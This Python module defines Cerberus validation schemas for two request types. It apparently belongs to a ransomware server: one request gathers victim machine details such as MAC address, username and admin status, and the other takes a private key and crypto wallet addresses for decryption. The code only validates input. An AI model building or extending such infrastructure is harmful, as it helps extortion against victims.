import logging
from cerberus import Validator
from werkzeug.exceptions import BadRequest

logger = logging.getLogger(__name__)

initialisation_parameters = {
    "client_id": {
        "type": "string",
        "required": True,
        "regex": "[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}",
    },
    "statistics": {
        "type": "dict",
        "schema": {
            "platform": {"type": "string", "required": True},
            "architecture": {"type": "string", "required": True},
            "mac_address": {"type": "string", "required": True},
            "device_name": {"type": "string", "required": True},
            "username": {"type": "string", "required": True},
            "is_admin": {"type": "boolean", "required": True},
        },
    },
}

decryption_parameters = {
    "client_id": {
        "type": "string",
        "required": True,
        "regex": "[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}",
    },
    "private_key": {"type": "list", "required": True},
    "assigned_wallet_address": {"type": "string", "required": True},
    "payee_wallet_address": {"type": "string", "required": True},
}


def validate_decryption_request(parameters):
    """Validate parameters for decryption request

    Args:
        parameters (dict): The request parameters in the decryption request

    Returns:
        boolean: Returns True if the validation is a success
    """
    logger.info("Validating decrypt parameters")
    decryption_validator = Validator(decryption_parameters)
    result = decryption_validator.validate(parameters)
    if result:
        return True
    logger.error("Validation Failed: {0}".format(decryption_validator.errors))
    raise BadRequest


def validate_initialisation_request(parameters):
    """Validate parameters for initialisation request

    Args:
        parameters (dict): The request parameters in the initialisation request

    Returns:
        boolean: Returns True if the validation is a success
    """
    logger.info("Validating initialisation parameters")
    initialisation_validator = Validator(initialisation_parameters)
    result = initialisation_validator.validate(parameters)
    if result:
        return True
    logger.error("Validation Failed: {0}".format(initialisation_validator.errors))
    raise BadRequest
